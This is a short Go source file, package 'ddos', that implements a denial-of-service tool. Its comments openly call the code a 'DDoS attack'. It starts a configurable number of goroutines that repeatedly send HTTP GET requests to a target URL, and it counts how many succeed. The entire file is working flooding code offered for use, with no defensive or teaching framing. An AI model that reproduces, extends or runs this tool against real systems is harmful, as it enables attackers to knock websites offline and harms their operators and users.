package ddos

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          chan struct{}
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("amount of workers cannot be less than 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("undefined host or error = %v", err)
	}
	return &DDoS{
		url:           URL,
		stop:          make(chan struct{}),
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-d.stop:
					return
				default:
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(io.Discard, resp.Body)
						_ = resp.Body.Close()
					}
					time.Sleep(10 * time.Millisecond)
				}
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	close(d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
